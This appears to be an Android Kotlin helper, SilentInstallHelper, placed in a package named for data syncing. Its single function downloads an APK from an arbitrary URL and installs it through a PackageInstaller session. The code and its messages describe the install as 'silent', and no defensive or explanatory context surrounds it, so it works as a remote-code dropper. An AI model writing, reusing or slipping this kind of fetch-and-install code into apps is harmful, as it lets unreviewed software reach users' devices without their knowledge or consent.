package com.example.data.sync

import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.content.pm.PackageInstaller
import android.os.Build
import android.util.Log
import java.io.File
import java.io.FileInputStream
import java.net.URL

object SilentInstallHelper {
    private const val TAG = "SilentInstallHelper"

    fun installApkFromUrl(context: Context, apkUrl: String): String {
        try {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
                return "Silent installation requires Android 5.0+"
            }

            val tempFile = File(context.cacheDir, "downloaded_app.apk")
            URL(apkUrl).openStream().use { input ->
                tempFile.outputStream().use { output ->
                    input.copyTo(output)
                }
            }

            val packageInstaller = context.packageManager.packageInstaller
            val params = PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)
            val sessionId = packageInstaller.createSession(params)
            val session = packageInstaller.openSession(sessionId)

            FileInputStream(tempFile).use { input ->
                session.openWrite("package.apk", 0, tempFile.length()).use { output ->
                    input.copyTo(output)
                    session.fsync(output)
                }
            }

            val intent = Intent(context, SilentInstallReceiver::class.java)
            val pendingIntent = PendingIntent.getBroadcast(
                context,
                sessionId,
                intent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE
            )

            session.commit(pendingIntent.intentSender)
            session.close()

            return "Silent APK installation session committed successfully for URL: $apkUrl"
        } catch (e: Exception) {
            Log.e(TAG, "Silent install error: ${e.message}")
            return "Silent installation failed: ${e.message}"
        }
    }
}
